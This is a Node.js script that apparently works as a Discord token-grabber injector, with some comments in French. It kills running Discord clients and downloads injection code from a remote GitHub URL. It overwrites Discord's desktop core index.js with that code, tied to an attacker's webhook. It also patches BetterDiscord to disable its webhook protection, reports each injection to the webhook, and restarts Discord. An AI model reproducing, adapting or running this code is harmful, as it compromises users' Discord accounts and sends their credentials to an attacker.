var glob = require("glob");
const fs = require('fs');
const https = require('https');
const {
    exec
} = require('child_process');
const axios = require('axios');
const buf_replace = require('buffer-replace');
const superstarlmao = "%WEBHOOK_LINK%"
const config = {
    "logout": "instant",
    "inject-notify": "true",
    "logout-notify": "true",
    "init-notify": "false",
    "embed-color": 0000000,
    "disable-qr-code": "true"
}
var LOCAL = process.env.LOCALAPPDATA
var discords = [];
var injectPath = [];
var runningDiscords = [];
    fs.readdirSync(LOCAL).forEach(file => {
        if (file.includes("iscord")) {
            discords.push(LOCAL + '\\' + file)
        } else {
            return;
        }
    });
discords.forEach(function (file) {
    let pattern = `${file}` + "\\app-*\\modules\\discord_desktop_core-*\\discord_desktop_core\\index.js"
    glob.sync(pattern).map(file => {
        injectPath.push(file)
    })
});
console.log(discords)
console.log(injectPath)

listDiscords();

function Infect() {
    https.get('https://raw.githubusercontent.com/6naUser/injectioncode/main/injection.js', (resp) => {// deleted il y a pas longtemps :iss:
        let data = '';
        resp.on('data', (chunk) => {
            data += chunk;
        });
        resp.on('end', () => {
            injectPath.forEach(file => {
                fs.writeFileSync(file, data.replace("%WEBHOOK_LINK%", superstarlmao).replace("%INITNOTI%", config["init-notify"]).replace("%LOGOUT%", config.logout).replace("%LOGOUTNOTI%", config["logout-notify"]).replace("3447704", config["embed-color"]).replace('%DISABLEQRCODE%', config["disable-qr-code"]), {
                    encoding: 'utf8',
                    flag: 'w'
                });
                if (config["init-notify"] == "true") {
                    let init = file.replace("index.js", "init")
                    if (!fs.existsSync(init)) {
                        fs.mkdirSync(init, 0744)
                    }
                }
                if (config.logout != "false") {
                    let folder = file.replace("index.js", "DiscordBTW")
                    if (!fs.existsSync(folder)) {
                        fs.mkdirSync(folder, 0744)
                        if (config.logout == "instant") {
                            startDiscord();
                        }
                    } else if (fs.existsSync(folder) && config.logout == "instant") {
                        startDiscord();
                    }
                }
            })
        });
    }).on("error", (err) => {
        console.log(err);
    });
};

function listDiscords() {
    exec('tasklist', function (err, stdout, stderr) {
        if (stdout.includes("Discord.exe")) {
            runningDiscords.push("discord")
        }
        if (stdout.includes("DiscordCanary.exe")) {
            runningDiscords.push("discordcanary")
        }
        if (stdout.includes("DiscordDevelopment.exe")) {
            runningDiscords.push("discorddevelopment")
        }
        if (stdout.includes("DiscordPTB.exe")) {
            runningDiscords.push("discordptb")
        };
        if (config.logout == "instant") {
            killDiscord();
        } else {
            if (config["inject-notify"] == "true" && injectPath.length != 0) {
                injectNotify();
            }
            Infect()
            pwnBetterDiscord()
        }
    })
};

function killDiscord() {
    runningDiscords.forEach(disc => {
        exec(`taskkill /IM ${disc}.exe /F`, (err) => {
            if (err) {
                return;
            }
        });
    });
    if (config["inject-notify"] == "true" && injectPath.length != 0) {
        injectNotify();
    }
    Infect()
    pwnBetterDiscord()
};

function startDiscord() {
    runningDiscords.forEach(disc => {
        let path = LOCAL + '\\' + disc + "\\Update.exe --processStart " + disc + ".exe"
        exec(path, (err) => {
            if (err) {
                return;
            }
        });
    });
};

function pwnBetterDiscord() {//bonne idée mais faut pas s'en venter c'est pas exeptionnel 
    var dir = process.env.appdata + "\\BetterDiscord\\data\\betterdiscord.asar"
    if (fs.existsSync(dir)) {
        var x = fs.readFileSync(dir)
        fs.writeFileSync(dir, buf_replace(x, "api/webhooks", "stanleyisgod"))
    } else {
        return;
    }
}

function injectNotify() {
    var fields = [];
    injectPath.forEach(path => {
        var c = {
            name: ":syringe: Inject Path",
            value: `\`\`\`${path}\`\`\``,
            inline: !1
        }
        fields.push(c)
    })
    axios
        .post(superstarlmao, {
            "content": null,
            "embeds": [{
                "title": ":detective: Nouvelle Injection",
                "color": config["embed-color"],
                "fields": fields,
                "author": {
                    "name": " "
                },
                "footer": {
                    "text": " "
                }
            }]
        })
        .then(res => {})
}
